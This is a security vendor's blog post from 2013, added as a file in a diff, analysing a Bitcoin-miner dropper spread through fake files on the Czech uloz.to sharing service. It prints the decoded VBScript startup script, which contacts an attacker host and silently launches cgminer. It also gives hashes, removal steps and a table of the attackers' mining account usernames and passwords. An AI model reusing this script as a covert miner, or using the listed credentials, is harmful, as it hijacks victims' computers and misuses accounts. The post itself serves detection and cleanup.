@@ -1,0 +1,108 @@
+Malicious Bitcoin Miners target Czech Republic
+
+
+
+
+
+
+
+
+
+
+
+Threat Intelligence Team, 1 August 2013
+
+Malicious Bitcoin Miners target Czech RepublicToday we are going to talk to those of you who use Bitcoin digital currency to pay for a variety of goods and services - along with a warning about yet another source of Bitcoin miners - the sharing services. You may think that if you avoid cracks and keygens while browsing the web you will be safe. Well, we would recommend that you reconsider that position. Recently we found that on the uloz.to file sharing service someone uploaded a lot of fake files containing Bitcoin miners!
+Bitcoin Mining service
+First a little background for the uninitiated: Bitcoins can be obtained by trading real currency, goods, or services with people who have them or alternatively, through mining. The mining process involves running software that performs complex math problems for which you're rewarded a share of the income. There are a finite amount of Bitcoins to be had, and mining for them can be compared to extracting gold or diamonds from the earth. The more you get, the fewer there are to be had, so it becomes increasingly harder and more expensive. Here's a descriptive article about mining.
+Bitcoin mining services such as bitminter.com use shared computer resources of their users to mine new Bitcoins. In order to participate, the mining users have to create an account and then register their computers (workers) with the service. Then they simply run the Bitcoin miner program provided with their credentials on as many computers as they have. In the end, if they had enough computation power and time they might end up with a few Bitcoins.
+It can be expected that some people will not be satisfied just using their own machines so they will try to use the computing power of unsuspecting victims. And that's exactly what the authors of this malware are doing: They use hardware that does not belong them to generate more money.
+It's not a Bitcoin problem; it's a people problem
+We must stress that there's nothing wrong with Bitcoin or its mining services. The problem is that some greedy people are misusing them.
+Some of them can be seen on the following image.  The word "cestina" means that the file should contain Czech localization of the referenced program. All of them contain a hidden feature, and sometimes the name is a complete fabrication. For example, The-Night-of-the-Rabbit-cestina.exe contains a crack for Call of Duty 4. Notice too, that all these files have an elevated popularity; no doubt a result of tampering. Some downloaders already suspect something fishy about these files.
+
+
+ 
+Malware analysis
+If you run the downloaded installer, new files will be created in "c:\windows\inf\" directory. The first dropped file is ntvdm.inf which contains configuration information for the Bitcoin miner. The second file is named ntvdm.vbe and contains the miner's start-up script encoded with  Microsoft Script Encoder. Furthermore, there is a randomly-named directory created with miners binaries. Attackers use opensource cgminer which is available on GitHub.
+
+
+
+Fortunately it was quite easy to decode the start-up script. With a little modification for better readability we got this result:
+set shell=wScriPt.CreateObject("WScript.Shell"):
+wIndowSdIr=sheLl.ExpaNdenVIronmentStrIngs("%windir%"):
+hOmeDir=shell.expandEnvironmentstrings("%USERPROFILE%"):
+WscrIpt.echo hoMedIr:
+Set objFSO=CreateObject("Scripting.FileSystemObject"):
+If objFSO.FIleexists(windowsdIr&amp;"\system32\OpenCL.dll") Then
+ if Not oBjFSO.FilEExIsts(hOmedir&amp;"\regbcm")THEn sEt objXmLhTTP=CreateObject("MSXML2.XMLHTTP"):
+  objxMLhTtP.open"GET","http://msdrv64.com/register_sl&#97;ve.php",false:
+  objXMLHttP.Send():
+  Set regFile=objFsO.CreaTeTextFile(homedIr&amp;"\regbcm",TRue):
+  regFile.Close:
+ End if:
+ Set ObjwMIServiCe=GEtObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"):
+ sEt objstartup=oBjWMIServiCe.Get("Win32_ProcessStartup"):
+ SEt objConFig=ObjSTArtup.SpawnInstaNce_:
+ objConfiG.ShowWindOw=12:
+ Set objProcESs=GetObjEcT("winmgmts:root\cimv2:Win32_Process"):
+ Set objFSO=CreateObject("Scripting.FileSystemObject"):
+ SeT lisTfile=objFSo.OpeNTexTFilE("c:\windows\inf\ntvdm.inf"):
+ eXEcName=lIstFile.ReAdLine:
+ urL=lIstFIle.ReadLine:
+ login=listfile.ReAdLiNe:
+ PassWOrd=LisTFilE.ReaDLine:
+ path=winDowsdir&amp;"\inf\"&amp;execNAmE&amp;"\"&amp;exeCName&amp;".exe -o "&amp;url&amp;" -u "&amp;login&amp;" -p "&amp;passworD:
+ errReturN=ObjProcess.CrEate(path,null,oBjconFig,iNTProcessID):
+End If
+Notice the first condition which checks whether the OpenCL library is present on the system. This library is used for massively parallel computing by the miner (remember that mining Bitcoins is a very difficult computational problem and therefore requires parallelism). If the library is not found the miner will not start.
+The following condition tests if the directory "%USERPROFILE%\regbcm" exists. If not the script contacts h**p://msdrv64.com/register_slave.php creates the conditional file which is probably working as a global mutex. This process seems to function as the infection counter since there is no downloaded data.
+As the last step, the configuration information is read from "c:\windows\inf\ntvdm.inf" and miner is started. An interesting feature of this script is that it finally flashes a message box with path to "%USERPROFILE%".
+
+Removing the malware
+If you have AVAST installed on your computer, it will automatically detect the malicious miner as VBS:FlufferMiner-A and delete it.
+To manually remove all residues of this application just terminate "C:\Windows\System32\WScript.exe" and any executable running from "C:\Windows\Inf\" or a program having its parent "C:\Windows\Inf\ntvdm.vbe". Then delete the entire directory mentioned in the first line of configuration file ntvdm.inf. Files "C:\Windows\Inf\ntvdm.vbe" and "C:\Windows\Inf\ntvdm.inf" delete as well.
+Samples SHA256
+Start-up script VBS:FlufferMiner-A:
+8E45B5AA70466A8551D205A06EEEA8D872140CB2E429120E61D668091E887CEE
+Installers:
+34E9AF426A95E094B153A6D2A2924DC78C4287592D55D806502BB5F2D5FF7C8B
+35EE9FFAF606EF8CC6220BDC7AB0F12A34711461AC49ECCA63E1BE00508DBBA3
+546362F2C959CC530DC3B444D5E1FB3165D0EB280F7BC9122A4BE2F98DAEA9E8
+55346DE3F225564D824CD94E17ECA0E19EA5004F06B48CE03C951AD064B6450E
+6816B3AC4BAD529ADF6503B42E2B7E38F10C5EE56A4656CD3F1271E33C8E5304
+90AD55C1DA4A4056F6E1B68A9B44B900E0D16E514038D8B4E632AB611182BAA2
+A4A27FB19AF8405462D2A2897793C35ADA7A1ABFA2B39BE2BE017A5FAB34BD7F
+B33866943B24B1251F0323535563AE8823EE93C0A4987F7040985C8D3B90434D
+CC01E0C2BA218E8DC2B75991BA3F68A178D33DE0F58D5DBD803FDD53A742462D
+EEB5F7405F6441AE1FD091769F8F99AE8DD1A2D6CDBB2D15BB60632B93714DA6
+
+Misusing user accounts
+<strong>user name   worker name	  password</strong>
+frankfrank  frankus       frankus575
+franzpat    pateil        patology
+humbo	    humbobo       humbra
+icemann	    powerhw1      freaky
+kansasan    kansasboy     desertpete
+kuller5	    kuller500     kulinaro
+mazdafan    mazdahmm      corvette
+pakostan    pakostan01	  shalala555
+pollack	    smasher10	  smogfog
+richierich  richiebitch   makemybuck
+simmoun	    fluffer       fartbart
+sorrypal    paypal        payme
+stuczle	    passike       matlar
+trinkrapek  chuck01       pioneer123
+
+
+
+Check 1 comments or write your comment
+
+
+
+
+
+
+
+
+
